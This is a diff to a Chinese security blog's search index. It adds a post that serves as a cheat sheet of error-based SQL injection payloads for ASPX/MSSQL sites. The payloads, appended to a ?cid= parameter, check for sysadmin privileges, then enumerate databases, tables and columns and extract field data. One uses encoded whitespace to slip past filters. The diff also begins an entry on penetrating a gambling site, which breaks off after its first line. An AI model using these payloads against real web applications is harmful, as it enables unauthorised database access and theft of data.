@@ -1,6 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ASPX+MSSQL注入</title>
+    <url>/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/1.png" alt="1.png"></p>
+<p>好久没更新博客了,今天有空记录下mssql注入,免得命令久了搞忘了.</p>
+<a id="more"></a>
+
+<p>##获取数据库版本<br>?cid=1 and @@version&gt;0  数据库信息<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/9.png" alt="9.png"></p>
+<p>##判断用户权限</p>
+<p>?cid=1 and 1=CONVERT(int,(select suser_sname())) 判断用户是不是sa权限<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/2.png" alt="2.png"><br>?cid=1 and (select is_srvrolemember(‘sysadmin’))&gt;0 当页面正常返回表示为管理员权限<br>?cid=1 and (select is_srvrolemember(‘db_owner’))&gt;0 判断当前用户写文件、读文件的权限<br>?cid=1and (select is_srvrolemember(‘public’))&gt;0    判断是否有public权限，可以爆破表</p>
+<p>##获取数据库总数</p>
+<p>?cid=1 AND 1=CONVERT(INT,(CHAR(58)%2bCHAR(58)%2b(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )%2bCHAR(58)%2bCHAR(58)))<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/3.png" alt="3.png"></p>
+<p>##获取数据库名称</p>
+<p>?cid=1 and 1=(convert(int,db_name())) 这里db_name(N) N就是填写数量分别爆出数据库名称<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/4.png" alt="4.png"></p>
+<p>##获取表名总数</p>
+<p>AND 1=CONVERT(INT,(CHAR(58)%2bCHAR(58)%2b(SELECT%0btop%0b1%0bCAST(COUNT(*)%0bAS%0bnvarchar(4000))%0bFROM%0binformation_schema.TABLES%0b)%2bCHAR(58)%2bCHAR(58)))<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/5.png" alt="5.png"></p>
+<p>##获取表名</p>
+<p>###第一种方法<br>and 1=convert(int,(select top 1 table_name from information_schema.tables))<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/6.png" alt="6.png"><br>and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘requ’,’xxx’) )) 这里通过not in  把查询的表进行连接着一起<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/7.png" alt="7.png"></p>
+<p>###第二种方法<br>依次通过and name &lt;&gt; 将每次查询的表连接并且进行查询下个表名<br>?cid=1 and 1=(select top 1 name from sysobjects where xtype=’U’)<br>?cid=1 and 1=(select top 1 name from sysobjects where xtype=’U’ and name &lt;&gt; ‘requ’)<br>?cid=1 and 1=(select top 1 name from sysobjects where xtype=’U’ and name &lt;&gt; ‘requ’ and name &lt;&gt; ‘xxxx’)</p>
+<p>##获取字段</p>
+<p>?cid=1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=’xxxs’))<br>?cid=1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=’news’ and column_name not in(‘nid,’xxx’,’1111’))) 这里也是通过not in()进行遍历获取数据库字段<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/8.png" alt="8.png"></p>
+<p>##获取字段数据<br>and 1=convert(int,(select top 1 title from news ))<br>and 1=convert(int,(select top 1 字段名 from 表明 ))<br><img data-src="/2020/04/27/ASPX+MSSQL%E6%B3%A8%E5%85%A5/10.png" alt="10.png"></p>
+]]></content>
+      <categories>
+        <category>sql</category>
+      </categories>
+      <tags>
+        <tag>ASPX+MSSQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bc站实战渗透</title>
     <url>/2020/03/27/bc%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<p><img data-src="/2020/03/27/bc%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/1.png" alt="1.png"><br>水文一篇还请各位师傅手下留情,没有任何技术含量.</p>
